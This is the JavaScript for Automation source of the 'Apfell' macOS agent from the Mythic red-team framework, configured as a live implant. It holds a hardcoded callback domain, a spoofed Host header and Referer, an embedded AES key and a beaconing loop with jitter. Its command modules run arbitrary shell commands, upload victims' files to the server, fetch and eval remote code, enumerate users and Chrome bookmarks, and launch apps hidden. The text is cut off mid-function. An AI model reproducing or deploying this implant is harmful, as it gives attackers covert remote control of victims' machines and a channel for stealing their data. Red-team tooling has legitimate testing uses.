// Created by Cody Thomas - @its_a_feature_
ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class agent{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = "";
		this.user = ObjC.deepUnwrap(this.procInfo.userName);
		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.deepUnwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.deepUnwrap(this.procInfo.arguments);
		this.osVersion = this.procInfo.operatingSystemVersionString.js;
		this.uuid = "adb17e76-09a9-4f1d-bad8-431904a27e8a";
	}
}
var apfell = new agent();
//--------------Base C2 INFORMATION----------------------------------------
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	//   You're welcome to add additional functions as well, but this is the minimum
	constructor(interval, baseurl){
		this.interval = interval; //seconds between callbacks
		this.baseurl = baseurl; //where to reach out to
		this.commands = [];
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(task, output){
		//output a response to a task
	}
	setConfig(params){
		//updates the current configuration for how to get tasking
	}
	download(task, params){
	    //gets a file from the apfell server in some way
	}
	upload(task, params){
	    //uploads a file in some way to the teamserver
	}
}
//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{
	constructor(interval, cback_host, cback_port){
		if(cback_port === "443" && cback_host.includes("https://")){
			super(interval, cback_host);
		}else if(cback_port === "80" && cback_host.includes("http://")){
			super(interval, cback_host);
		}else{
			let last_slash = cback_host.indexOf("/", 8);
			if(last_slash === -1){
				//there is no 3rd slash
				super(interval, cback_host + ":" + cback_port);
			}else{
				//there is a 3rd slash, so we need to splice in the port
				super(interval,cback_host.substring(0, last_slash) + ":" + cback_port + "/" + cback_host.substring(last_slash))
			}
		}
		this.commands = [];
		this.url = this.baseurl;
		this.getURI = "fetchVideoData.php";
		this.postURI = "mput";
		this.queryPathName = "keyword";
		this.proxyURL = "";
		this.proxyPort = "";
		this.proxyUser = "";
		this.proxyPassword = "";
		this.proxy_dict = {};
		if(this.proxyURL !== ""){
			if(this.proxyURL.includes("https")) {
				this.proxy_dict["HTTPSEnable"] = 1;
				this.proxy_dict["HTTPSProxy"] = this.proxyURL;
				this.proxy_dict["HTTPSPort"] = parseInt(this.proxyPort);
			}else{
				this.proxy_dict["HTTPEnable"] = 1;
				this.proxy_dict["HTTPProxy"] = this.proxyURL;
				this.proxy_dict["HTTPPort"] = parseInt(this.proxyPort);
			}
		}
		if(this.proxyUser !== ""){
			this.proxy_dict["kCFProxyUsernameKey"] = this.proxyUser;
		}
		if(this.proxyPassword !== ""){
			this.proxy_dict["kCFProxyPasswordKey"] = this.proxyPassword;
		}
		this.jitter = 42;
		this.header_list = [{"name": "User-Agent", "key": "User-Agent", "value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.77", "custom": false}, {"name": "Host", "key": "Host", "value": "advisyswebservice.com", "custom": false}, {"name": "*", "key": "Referer", "value": "https://www.advids.co/", "custom": true}];
		this.aes_psk = "km8tcBlWewYC6Xrd8kjbLoUDMmJRIqYTZPwMhq54iAs="; // base64 encoded key
		if(this.aes_psk !== ""){
		    this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
		    $.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            let err = Ref();
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
		}
        this.using_key_exchange = "T" === "T";
		this.exchanging_keys = this.using_key_exchange;
		if("2022-08-07" !== "yyyy-mm-dd" && "2022-08-07" !== ""){
			this.dateFormatter = $.NSDateFormatter.alloc.init;
        	this.dateFormatter.setDateFormat("yyyy-MM-dd");
        	this.kill_date = this.dateFormatter.dateFromString('2022-08-07');
		}else{
			this.kill_date = $.NSDate.distantFuture;
		}
	}
	get_random_int(max) {
        return Math.floor(Math.random() * Math.floor(max + 1));
    }
    gen_sleep_time(){
      //generate a time that's this.interval += (this.interval * 1/this.jitter)
      if(this.jitter < 1){return this.interval;}
      let plus_min = this.get_random_int(1);
      if(plus_min === 1){
          return this.interval + (this.interval * (this.get_random_int(this.jitter)/100));
      }else{
          return this.interval - (this.interval * (this.get_random_int(this.jitter)/100));
      }
    }
	encrypt_message(uid, data){
	    // takes in the string we're about to send, encrypts it, and returns a new string
	    let err = Ref();
	    let encrypt = $.SecEncryptTransformCreate(this.cryptokey,err);
	    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);

        //generate a random IV to use
	    let IV = $.NSMutableData.dataWithLength(16);
	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
	    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
	    // set our data to be encrypted
	    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
        b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
        //$.CFShow(err[0]);
        let encryptedData = $.SecTransformExecute(encrypt, err);
        // now we need to prepend the IV to the encrypted data before we base64 encode and return it
        //generate the hmac
	    let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
	    let hmac_input = $.NSMutableData.dataWithLength(0);
	    hmac_input.appendData(IV);
	    hmac_input.appendData(encryptedData);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, hmac_input, err);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);

        let final_message = $.NSMutableData.dataWithLength(0);
        final_message.appendData( $(uid).dataUsingEncoding($.NSUTF8StringEncoding) );
        final_message.appendData(IV);
        final_message.appendData(encryptedData);
        final_message.appendData(hmac_data);
        return final_message.base64EncodedStringWithOptions(0);
	}
	decrypt_message(nsdata){
        //takes in a base64 encoded string to be decrypted and returned
        //console.log("called decrypt");
        let err = Ref();
        let decrypt = $.SecDecryptTransformCreate(this.cryptokey, err);
        $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
	    //console.log("making ranges");
        //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
        let iv_range = $.NSMakeRange(0, 16);
        let message_range = $.NSMakeRange(16, nsdata.length - 48); // 16 for IV 32 for hmac
        let hmac_range = $.NSMakeRange(nsdata.length - 32, 32);
        let hmac_data_range = $.NSMakeRange(0, nsdata.length - 32); // hmac includes IV + ciphertext
        //console.log("carving out iv");
        let iv = nsdata.subdataWithRange(iv_range);
        $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
        let message = nsdata.subdataWithRange(message_range);
        $.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
        // create an hmac and verify it matches
        let message_hmac = nsdata.subdataWithRange(hmac_range);
        let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, nsdata.subdataWithRange(hmac_data_range), err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);
		if(hmac_data.isEqualToData(message_hmac)){
			let decryptedData = $.SecTransformExecute(decrypt, Ref());
	        //console.log("making a string from the message");
	        let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
	        //console.log(decrypted_message.js);
	        return decrypted_message;
		}
		else{
			return undefined;
		}
	}
	negotiate_key(){
        // Generate a public/private key pair
        let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
        let err = Ref();
        let privatekey = $.SecKeyCreateRandomKey(parameters, err);
        //console.log("generated new key");
        let publickey = $.SecKeyCopyPublicKey(privatekey);
        let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
        //$.CFShow($.CFMakeCollectable(err[0]));
        try{
        	//this is the catalina case
        	let b64_exported_public = $.CFMakeCollectable(exported_public);
        	b64_exported_public = b64_exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
        	exported_public = b64_exported_public;
        }catch(error){
        	//this is the mojave and high sierra case
        	exported_public = exported_public.base64EncodedStringWithOptions(0).js;
        }
        let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	    let session_key = Array(20).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	    let initial_message = {"session_id": session_key, "pub_key": exported_public, "action": "staging_rsa"};
	    // Encrypt our initial message with sessionID and Public key with the initial AES key
	    while(true){
	        try{
	        	let stage1 = this.htmlPostData(initial_message, apfell.uuid);
	        	let enc_key = $.NSData.alloc.initWithBase64Encoding(stage1['session_key']);
                let dec_key = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, enc_key, err);
                // Adjust our global key information with the newly adjusted session key
				try{
					this.aes_psk = dec_key.base64EncodedStringWithOptions(0).js; // base64 encoded key
				}catch(error){
					let dec_key_collectable = $.CFMakeCollectable(dec_key);
					dec_key_collectable = dec_key_collectable.base64EncodedStringWithOptions(0).js;
					this.aes_psk = dec_key_collectable;
				}
                //console.log(JSON.stringify(json_response));
                this.parameters = $({"type": $.kSecAttrKeyTypeAES});
                this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
                this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
                this.exchanging_keys = false;
                return stage1['uuid'];
            }catch(error){
            	console.log(error.toString());
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
            }
        }
	}
	getConfig(){
		//A RESTful base config consists of the following:
		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
        let config = {
            "C2": {
                "baseurl": this.baseurl,
                "interval": this.interval,
                "jitter": this.jitter,
                "commands": this.commands.join(", "),
                "api_version": this.api_version,
                "header_list": this.header_list,
                "aes_psk": this.aes_psk
            },
            "Host": {
                "user": apfell.user,
                "fullName": apfell.fullName,
                "ips": apfell.ip,
                "hosts": apfell.host,
                "environment": apfell.environment,
                "uptime": apfell.uptime,
                "args": apfell.args,
                "pid": apfell.pid,
                "apfell_id": apfell.id,
                "payload_id": apfell.uuid
            }};
		return JSON.stringify(config, null, 2);
	}
	checkin(ip, pid, user, host, os, arch, domain){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os":os, "architecture": arch, "domain": domain, "action": "checkin"};
		info["process_name"] = apfell.procInfo.processName.js;
		info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
		if(user === "root"){
		    info['integrity_level'] = 3;
		}
		//calls htmlPostData(url,data) to actually checkin
		//Encrypt our data
		//gets back a unique ID
        if(this.using_key_exchange){
            let sessionID = this.negotiate_key();
            //console.log("got session ID: " + sessionID);
            var jsondata = this.htmlPostData(info, sessionID);
        }else{
            var jsondata = this.htmlPostData(info, apfell.uuid);
        }
		apfell.id = jsondata.id;
		// if we fail to get a new ID number, then exit the application
		if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
		//console.log(apfell.id);
		return jsondata;
	}
	getTasking(){
		while(true){
		    try{
		        //let data = {"tasking_size":1, "action": "get_tasking"};
		        //let task = this.htmlPostData(this.url, data, apfell.id);
				let task = this.htmlGetData();
		        //console.log("tasking got back: " + JSON.stringify(task));
		        return task['tasks'];
		    }
		    catch(error){
		    	//console.log(error.toString());
		        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
		    }
		}
	}
	postResponse(task, output){
	    // this will get the task object and the response output
	    return this.postRESTResponse(output, task.id);
	}
	postRESTResponse(data, tid){
		//depending on the amount of data we're sending, we might need to chunk it
		data["task_id"] =  tid;
		let postData = {"action": "post_response", "responses": [data]};
		return this.htmlPostData(postData, apfell.id);
	}
	htmlPostData(sendData, uid, json=true){
	    let url = this.baseurl;
	    if(this.postURI !== ""){ url += "/" + this.postURI;}
        //console.log(url);
        //encrypt our information before sending it
		let data;
        if(this.aes_psk !== ""){
            data = this.encrypt_message(uid, JSON.stringify(sendData));
        }else if(typeof(sendData) === "string"){
        	data = $(uid + sendData).dataUsingEncoding($.NSUTF8StringEncoding);
            data = data.base64EncodedStringWithOptions(0);
        }else{
        	data = $(uid + JSON.stringify(sendData)).dataUsingEncoding($.NSUTF8StringEncoding);
            data = data.base64EncodedStringWithOptions(0);
		}
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
				  $.NSApplication.sharedApplication.terminate(this);
				}
				if( (apfell.id === undefined || apfell.id === "") && (uid === undefined || uid === "")){ $.NSApplication.sharedApplication.terminate(this);}
				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				let postData = data.dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
				let postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				for(let i = 0; i < this.header_list.length; i++){
					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[i]["value"]), $.NSString.alloc.initWithUTF8String(this.header_list[i]["key"]));
				}
				req.setHTTPBody(postData);
				let response = Ref();
				let error = Ref();
				let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
				session_config.connectionProxyDictionary = $(this.proxy_dict);
                let session = $.NSURLSession.sessionWithConfiguration(session_config);
				let finished = false;
				let responseData;
				session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
					finished = true;
					responseData = data;
				}).resume;
				while(!finished){
					delay(0.1);
				}
				//responseData is base64(UUID + data)
				if( responseData.length < 36){
					$.NSThread.sleepForTimeInterval(this.gen_sleep_time());
			    	continue;
				}
				let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
		        let message_range = $.NSMakeRange(36, resp.length - 36);
		        //let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
		        resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					if(json){
						resp = ObjC.unwrap(this.decrypt_message(resp));
						return JSON.parse(resp);
					}else{
						return this.decrypt_message(resp);
					}
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					if(json){
						return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
					}else{
						return $.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding).js;
					}
				}
			}
			catch(error){
				//console.log(error.toString());
			    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
			}
		}
	}
	htmlGetData(){
		let data = {"tasking_size":1, "action": "get_tasking"};
		if(this.aes_psk !== ""){
			data = this.encrypt_message(apfell.id, JSON.stringify(data)).js;
		}else{
			data = $(apfell.id + JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding);
			data = data.base64EncodedStringWithOptions(0).js;
		}
		let NSCharacterSet = $.NSCharacterSet.characterSetWithCharactersInString("/+=\n").invertedSet;
		data = $(data).stringByAddingPercentEncodingWithAllowedCharacters(NSCharacterSet).js;
		let url = this.baseurl;
		if(this.getURI !== ""){ url += "/" + this.getURI; }
		url += "?" + this.queryPathName + "=" + data;
	    while(true){
	        try{
	        	if( $.NSDate.date.compare(this.kill_date) === $.NSOrderedDescending ){
				  $.NSApplication.sharedApplication.terminate(this);
				}
	        	if(apfell.id === undefined || apfell.id === ""){ $.NSApplication.sharedApplication.terminate(this);}
	            let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
                for(let i = 0; i < this.header_list.length; i++){
					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[i]["value"]), $.NSString.alloc.initWithUTF8String(this.header_list[i]["key"]));
				}
                let response = Ref();
                let error = Ref();
                let session_config = $.NSURLSessionConfiguration.ephemeralSessionConfiguration;
				session_config.connectionProxyDictionary = $(this.proxy_dict);
                let session = $.NSURLSession.sessionWithConfiguration(session_config);
				let finished = false;
				let responseData;
				session.dataTaskWithRequestCompletionHandler(req, (data, resp) => {
					finished = true;
					responseData = data;
				}).resume;
				while(!finished){
					delay(0.1);
				}
				if(responseData.length < 36){
                    //this means we likely got back some form of error or redirect message, not our actual data
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    continue;
                }
				let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
				//let uuid_range = $.NSMakeRange(0, 36);
		        let message_range = $.NSMakeRange(36, resp.length - 36);
		        //let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
		        resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
				//we're not doing the initial key exchange
				if(this.aes_psk !== ""){
					//if we do need to decrypt the response though, do that
					resp = ObjC.unwrap(this.decrypt_message(resp));
					return JSON.parse(resp);
				}else{
					//we don't need to decrypt it, so we can just parse and return it
					return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
				}
	        }
	        catch(error){
	            //console.log("error in htmlGetData: " + error.toString());
	            $.NSThread.sleepForTimeInterval(this.gen_sleep_time()); //wait timeout seconds and try again
	        }
	    }
	}
	download(task, params){
        // download just has one parameter of the path of the file to download
        let output = "";
		if( does_file_exist(params) ){
            let offset = 0;
            let chunkSize = 512000; //3500;
            // get the full real path to the file
            let full_path = params;
            try{
            	let fm = $.NSFileManager.defaultManager;
            	let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
            	full_path = "/" + pieces.slice(1).join("/");
                var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
                if(handle.js === undefined){
                	return {"status": "error", "user_output": "Access denied or path was to a folder", "completed": true};
				}
                // Get the file size by seeking;
                var fileSize = handle.seekToEndOfFile;
            }catch(error){
                return {'status': 'error', 'user_output': error.toString(), 'completed': true};
            }
            // always round up to account for chunks that are < chunksize;
            let numOfChunks = Math.ceil(fileSize / chunkSize);
            let registerData = {'total_chunks': numOfChunks, 'full_path': full_path};
            let registerFile = this.postResponse(task, registerData);
            registerFile = registerFile['responses'][0];
            if (registerFile['status'] === "success"){
            	this.postResponse(task, {"user_output": JSON.stringify({
						"agent_file_id": registerFile["file_id"],
						"total_chunks": numOfChunks
					})});
                handle.seekToFileOffset(0);
                let currentChunk = 1;
                let data = handle.readDataOfLength(chunkSize);
                while(parseInt(data.length) > 0 && offset < fileSize){
                    // send a chunk
                    let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js,'file_id': registerFile['file_id']};
                    this.postResponse(task, fileData);
                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
                    // increment the offset and seek to the amount of data read from the file
                    offset += parseInt(data.length);
                    handle.seekToFileOffset(offset);
                    currentChunk += 1;
                    data = handle.readDataOfLength(chunkSize);
                }
                output = {"completed":true, "file_id": registerFile['file_id']};
            }
            else{
               output = {'status': 'error', 'user_output': "Failed to register file to download", 'completed': true};
            }
        }
        else{
            output = {'status': 'error', 'user_output': "file does not exist", 'completed': true};
        }
        return output;
	}
	upload(task, file_id, full_path){
	    try{
            let data = {"action": "upload", "file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path, "task_id": task.id};
            let chunk_num = 1;
            let total_chunks = 1;
            let total_data = $.NSMutableData.dataWithLength(0);
            do{
            	let file_data = this.htmlPostData(data, apfell.id);
            	if(file_data['chunk_num'] === 0){
            		return "error from server";
            	}
            	chunk_num = file_data['chunk_num'];
            	total_chunks = file_data['total_chunks'];
            	total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data['chunk_data'])));
            	data = {"action": "upload", "file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1, "task_id": task.id};
            }while(chunk_num < total_chunks);
            return total_data;
	    }catch(error){
	        return error.toString();
	    }
	}
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
var C2 = new customC2(300, "https://advisyswebservice.com", "443");
//-------------SHARED COMMAND CODE ------------------------
does_file_exist = function(strPath){
    var error = $();
    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
};
convert_to_nsdata = function(strData){
    // helper function to convert UTF8 strings to NSData objects
    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSUnicodeStringEncoding);
    return tmpString.dataUsingEncoding($.NSUTF16StringEncoding);
};
write_data_to_file = function(data, file_path){
    try{
        //var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
        //currentApp.setEof(open_file, { to: 0 }); //clear the current file
        //currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
        //currentApp.closeAccess(open_file);
        if(typeof data == "string"){
            data = convert_to_nsdata(data);
        }
        if (data.writeToFileAtomically($(file_path), true)){
            return "file written";
        }
        else{
            return "failed to write file";
        }
     }
     catch(error){
        return "failed to write to file: " + error.toString();
     }
};
default_load = function(contents){
    var module = {exports: {}};
    var exports = module.exports;
    if(typeof contents == "string"){
        eval(contents);
    }
    else{
        eval(contents.js);
    }
    return module.exports;
};
base64_decode = function(data){
    if(typeof data == "string"){
        var ns_data = $.NSData.alloc.initWithBase64Encoding($(data));
    }
    else{
        var ns_data = data;
    }
    var decoded_data = $.NSString.alloc.initWithDataEncoding(ns_data, $.NSUTF8StringEncoding).js;
    return decoded_data;
};
base64_encode = function(data){
    if(typeof data == "string"){
        var ns_data = convert_to_nsdata(data);
    }
    else{
        var ns_data = data;
    }
    var encoded = ns_data.base64EncodedStringWithOptions(0).js;
    return encoded;
};
var exports = {};  // get stuff ready for initial command listing
exports.chrome_bookmarks = function(task, command, params){
    let chrome_bookmarks_enum_folder = function(folder, folderPath = "", parentIndex = ""){
        let folderData = {};
        folderData["Folder Name"] = folderPath + folder.title();
        folderData["bookmarks"] = [];
        // once we are done with folders, let's work on the bookmarked items
        let entries = chrome_bookmarks_enum_items(folder, parentIndex);
        folderData["bookmarks"].push(...entries);
        // for each folder under our current bookmark folder - call chrome_bookmarks_enum_folder
        for (let i = 0; i < folder.bookmarkFolders.length; i++){
            folderData["bookmarks"].push({...chrome_bookmarks_enum_folder(folder.bookmarkFolders[i], folderPath + folder.title() + "/",  String(folder.index()-1))});
        }
        return folderData;
    };

    let chrome_bookmarks_enum_items = function(folder, parentIndex){
        let bookmarks = folder.bookmarkItems;
        let entries = [];
        for (let j = 0; j < bookmarks.length; j++){
            let indexPath = parentIndex === "" ? String(folder.index()-1) + "/" + String(bookmarks[j].index()-1) : parentIndex + "/" + String(folder.index()-1) + "/" + String(bookmarks[j].index()-1);
            entries.push({
                "Title": bookmarks[j].title(),
                "URL": bookmarks[j].url(),
                "Folder/bookmark": indexPath
            });
        }
        return entries;
    };
	let all_data = [];
	try{
		let ch = Application("Google Chrome");
		if(ch.running()){
            let folders = ch.bookmarkFolders;
            for (let i = 0; i < folders.length; i ++){
                let folder = folders[i];
                // we are using the fact that JS passes arrays by reference here to pass a reference to all_data
                all_data.push(chrome_bookmarks_enum_folder(folder));
            }
        }
        else{
            return {"user_output": "Chrome is not running", "completed": true, "status": "error"};
        }
	}catch(error){
		let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return {"user_output":err, "completed": true, "status": "error"};
	}
	return {"user_output": JSON.stringify(all_data, null, 2), "completed": true};
};


exports.shell = function(task, command, params){
	//simply run a shell command via doShellScript and return the response
	let response = "";
	try{
		let command_params = JSON.parse(params);
		let command = command_params['command'];
	    if(command[command.length-1] === "&"){
	        //doShellScript actually does macOS' /bin/sh which is actually bash emulating sh
	        //  so to actually background a task, you need "&> /dev/null &" at the end
	        //  so I'll just automatically fix this so it's not weird for the operator
	        command = command + "> /dev/null &";
	    }
		response = currentApp.doShellScript(command);
		if(response === undefined || response === ""){
		    response = "No Command Output";
		}
		// shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
		response = response.replace(/\r/g, "\n");
		return {"user_output":response, "completed": true};
	}
	catch(error){
		response = error.toString().replace(/\r/g, "\n");
		return {"user_output":response, "completed": true, "status": "error"};
	}
};

exports.list_users = function(task, command, params){
    let all_users = [];
    let gid = -1;
    if (params.length > 0) {
        var data = JSON.parse(params);
        if (data.hasOwnProperty('gid') && data['gid'] !== "" && data['gid'] > 0) {
            gid = data['gid'];
        }
    }
    ObjC.import('Collaboration');
    ObjC.import('CoreServices');
    if (gid < 0) {
        let defaultAuthority = $.CBIdentityAuthority.defaultIdentityAuthority;
        let grouptolook = 1000 //Most systems don't have groups past 700s
        for (let x = 0; x < grouptolook; x++) {
            let group = $.CBGroupIdentity.groupIdentityWithPosixGIDAuthority(x, defaultAuthority);
            let validGroupcheck = group.toString()
            if (validGroupcheck === "[id CBGroupIdentity]") {
                let results = group.memberIdentities.js;

                let numResults = results.length;
                for (let i = 0; i < numResults; i++) {
                    let idObj = results[i];
                    let info = {
                        "POSIXName": idObj.posixName.js,
                        "POSIXID": idObj.posixUID,
                        "POSIXGID": group.posixGID,
                        "LocalAuthority": idObj.authority.localizedName.js,
                        "FullName": idObj.fullName.js,
                        "Emails": idObj.emailAddress.js,
                        "isHiddenAccount": idObj.isHidden,
                        "Enabled": idObj.isEnabled,
                        "Aliases": ObjC.deepUnwrap(idObj.aliases),
                        "UUID": idObj.UUIDString.js
                    };
                    all_users.push(info);
                }

            }
        }
        return {
            "user_output": JSON.stringify(all_users, null, 2),
            "completed": true
        }
    } else {
        let defaultAuthority = $.CBIdentityAuthority.defaultIdentityAuthority;
        let group = $.CBGroupIdentity.groupIdentityWithPosixGIDAuthority(gid, defaultAuthority);
        let results = group.memberIdentities.js;
        let numResults = results.length;
        for (let i = 0; i < numResults; i++) {
            let idObj = results[i];
            let info = {
                "POSIXName": idObj.posixName.js,
                "POSIXID": idObj.posixUID,
                "POSIXGID": group.posixGID,
                "LocalAuthority": idObj.authority.localizedName.js,
                "FullName": idObj.fullName.js,
                "Emails": idObj.emailAddress.js,
                "isHiddenAccount": idObj.isHidden,
                "Enabled": idObj.isEnabled,
                "Aliases": ObjC.deepUnwrap(idObj.aliases),
                "UUID": idObj.UUIDString.js
            };
            all_users.push(info);
        }
    }
    return {
        "user_output": JSON.stringify(all_users, null, 2),
        "completed": true
    };
};
exports.launchapp = function(task, command, params){
     //this should be the bundle identifier like com.apple.itunes to launch
    //it will launch hidden, asynchronously, and will be 'hidden' (still shows up in the dock though)
    let response = "";
	try{
		let command_params = JSON.parse(params);
		if(!command_params.hasOwnProperty('bundle')){ return {"user_output": "missing bundle identifier", "completed": true, "status": "error"}}
		ObjC.import('AppKit');
		$.NSWorkspace.sharedWorkspace.launchAppWithBundleIdentifierOptionsAdditionalEventParamDescriptorLaunchIdentifier(
		  command_params['bundle'],
		  $.NSWorkspaceLaunchAsync | $.NSWorkspaceLaunchAndHide | $.NSWorkspaceLaunchWithoutAddingToRecents,
		  $.NSAppleEventDescriptor.nullDescriptor,
		  null
		);
		return {"user_output":"Program launched", "completed": true};
	}
	catch(error){
		return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
};

exports.download = function(task, command, params){
    try{
    	if(params === "" || params === undefined){return {'user_output': "Must supply a path to a file to download", "completed": true, "status": "error"}; }
        return C2.download(task, params);
    }catch(error){
        return {'user_output': error.toString(), "completed": true, "status": "error"};
